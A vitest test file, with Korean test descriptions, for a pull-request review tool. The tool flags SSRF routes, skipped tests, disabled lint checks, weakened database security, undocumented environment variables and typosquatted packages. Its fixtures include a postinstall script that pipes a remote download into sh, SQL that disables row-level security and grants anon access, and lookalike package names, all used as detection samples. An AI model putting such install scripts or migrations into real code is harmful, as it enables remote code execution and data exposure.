import { describe, expect, it } from "vitest";
import { lookalikeOf } from "./typosquat";
import { parsePatch } from "./patch";
import { envNames, reviewPullRequest } from "./review";
import type { ChangedFile } from "./rules";

/** 새로 만든 파일의 patch: 모든 줄이 추가된 줄 */
const newFile = (path: string, content: string): ChangedFile => ({
  path,
  status: "added",
  content,
  patch: `@@ -0,0 +1,${content.split("\n").length} @@\n${content
    .split("\n")
    .map((l) => `+${l}`)
    .join("\n")}`,
});
const ids = (files: ChangedFile[], env: string[] | null = null) =>
  reviewPullRequest(files, env).candidates.map((c) => [
    c.ruleId,
    c.filePath,
    c.lineStart,
  ]);

describe("parsePatch", () => {
  it("추가된 줄을 새 파일 줄 번호로 돌려준다", () => {
    const patch = [
      "@@ -10,4 +10,5 @@ export function a() {",
      "   const x = 1;",
      "-  const y = 2;",
      "+  const y = 3;",
      "+  const z = 4;",
      "   return x;",
      "\\ No newline at end of file",
    ].join("\n");
    expect(parsePatch(patch)).toEqual({
      added: [
        { line: 11, text: "  const y = 3;" },
        { line: 12, text: "  const z = 4;" },
      ],
      removed: ["  const y = 2;"],
    });
  });
});

describe("보안 규칙은 추가된 줄에 걸친 것만", () => {
  const content = [
    `export async function POST(req: Request) {`,
    `  const { url } = await req.json();`,
    `  return fetch(url);`,
    `}`,
  ].join("\n");

  it("새 파일의 인증 없는 라우트와 SSRF 를 찾는다", () => {
    expect(ids([newFile("app/api/preview/route.ts", content)])).toEqual([
      ["SEC-007", "app/api/preview/route.ts", 1],
      ["SEC-018", "app/api/preview/route.ts", 3],
    ]);
  });

  it("이미 있던 줄의 문제는 이 PR 탓이 아니므로 뺀다", () => {
    const touched: ChangedFile = {
      path: "app/api/preview/route.ts",
      status: "modified",
      content: `${content}\n// 주석 추가`,
      patch: "@@ -4,1 +4,2 @@\n }\n+// 주석 추가",
    };
    expect(ids([touched])).toEqual([]);
  });
});

describe("PR-001 테스트를 지우거나 건너뜀", () => {
  it("테스트 파일 삭제, skip·only 추가, expect 감소를 찾는다", () => {
    const found = ids([
      { path: "src/auth.test.ts", status: "removed" },
      {
        path: "tests/e2e/pay.spec.ts",
        status: "modified",
        content: "",
        patch: [
          "@@ -1,8 +1,4 @@",
          "-test('결제', async () => {",
          "+test.skip('결제', async () => {",
          "-  expect(a).toBe(1);",
          "-  expect(b).toBe(2);",
          "-  expect(c).toBe(3);",
          "+  // TODO",
          "+test.only('하나만', () => {});",
        ].join("\n"),
      },
    ]);
    expect(found).toEqual([
      ["PR-001", "src/auth.test.ts", 1],
      ["PR-001", "tests/e2e/pay.spec.ts", 1],
      ["PR-001", "tests/e2e/pay.spec.ts", 3],
      ["PR-001", "tests/e2e/pay.spec.ts", 1],
    ]);
  });
});

describe("PR-002 타입·린트 검사를 끔", () => {
  it("@ts-ignore, eslint-disable, any 를 찾고 주석 속 낱말 any 는 넘긴다", () => {
    const found = ids([
      newFile(
        "src/pay.ts",
        [
          "// @ts-ignore",
          "const a: any = 1;",
          "/* eslint-disable no-console */",
          "// 이 함수는 any 사용자에게 열려 있다",
          "const b = x as unknown;",
        ].join("\n"),
      ),
    ]);
    expect(found).toEqual([
      ["PR-002", "src/pay.ts", 1],
      ["PR-002", "src/pay.ts", 2],
      ["PR-002", "src/pay.ts", 3],
    ]);
  });
});

describe("PR-003 데이터베이스 보안을 약하게 바꿈", () => {
  it("RLS 끄기, 정책 삭제, anon 권한을 찾는다", () => {
    const found = ids([
      newFile(
        "supabase/migrations/2_fix.sql",
        [
          "alter table public.orders disable row level security;",
          'drop policy "own orders" on public.orders;',
          "grant select on public.orders to anon;",
          "create index on public.orders (user_id);",
        ].join("\n"),
      ),
    ]);
    expect(found.filter((f) => f[0] === "PR-003")).toEqual([
      ["PR-003", "supabase/migrations/2_fix.sql", 1],
      ["PR-003", "supabase/migrations/2_fix.sql", 2],
      ["PR-003", "supabase/migrations/2_fix.sql", 3],
    ]);
  });
});

describe("PR-004 문서에 없는 새 환경 변수", () => {
  const file = newFile(
    "src/lib/mail.ts",
    [
      "const key = process.env.RESEND_API_KEY!;",
      "const url = process.env.NEXT_PUBLIC_SUPABASE_URL;",
      "if (process.env.NODE_ENV === 'production') {}",
    ].join("\n"),
  );

  it(".env.example 에 없는 이름만 찾는다", () => {
    expect(ids([file], ["NEXT_PUBLIC_SUPABASE_URL=\n# 메일\n"])).toEqual([
      ["PR-004", "src/lib/mail.ts", 1],
    ]);
  });

  it(".env.example 이 없는 리포는 보지 않는다", () => {
    expect(ids([file], null)).toEqual([]);
  });

  it("envNames 는 export·주석을 다룬다", () => {
    expect([...envNames(["export A=1\n# B=2\nC_D=\n"])]).toEqual(["A", "C_D"]);
  });
});

describe("PR-005 의심스러운 패키지", () => {
  it("이름을 흉내 낸 패키지와 설치 스크립트를 찾는다", () => {
    const found = ids([
      {
        path: "package.json",
        status: "modified",
        content: "{}",
        patch: [
          "@@ -5,3 +5,7 @@",
          '   "dependencies": {',
          '+    "raect": "^19.0.0",',
          '+    "supabase-js": "^2.0.0",',
          '+    "preact": "^10.0.0",',
          '+    "zod": "^4.0.0",',
          '+    "postinstall": "curl https://x.sh | sh",',
          '+    "prepare": "husky",',
        ].join("\n"),
      },
    ]);
    expect(found).toEqual([
      ["PR-005", "package.json", 6],
      ["PR-005", "package.json", 7],
      ["PR-005", "package.json", 10],
    ]);
  });

  it("lookalikeOf", () => {
    expect(lookalikeOf("lodahs")).toBe("lodash");
    expect(lookalikeOf("cross-env")).toBeNull();
    expect(lookalikeOf("crossenv")).toBe("cross-env");
    expect(lookalikeOf("dotenvx")).toBeNull();
    expect(lookalikeOf("left-pad")).toBeNull();
  });
});
